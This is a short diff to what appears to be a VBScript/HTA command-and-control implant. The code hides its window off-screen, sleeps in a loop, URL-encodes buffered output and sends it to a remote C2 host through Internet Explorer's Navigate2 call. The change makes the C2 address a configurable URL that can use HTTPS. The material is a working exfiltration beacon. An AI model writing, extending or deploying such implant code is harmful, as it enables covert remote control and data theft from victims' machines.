@@ -1,6 +1,6 @@
 window.moveTo -2000,-2000
 
-C2 = "192.168.5.4"
+C2 = "https://"
 sleepInterval = 1 * 2000
 outBuffer = ""
 
@@ -157,7 +157,7 @@ Function daLoop()
         Replace b, "+", "%2B"
         Replace b, "/", "%2F"
         Replace b, "=", "%3D"
-        objIE.Navigate2 "http://" & C2 & "/" & b, 14
+        objIE.Navigate2 C2 & "/" & b, 14
     End If
 
     a = window.setTimeout("daLoop", sleepInterval, "VBScript")
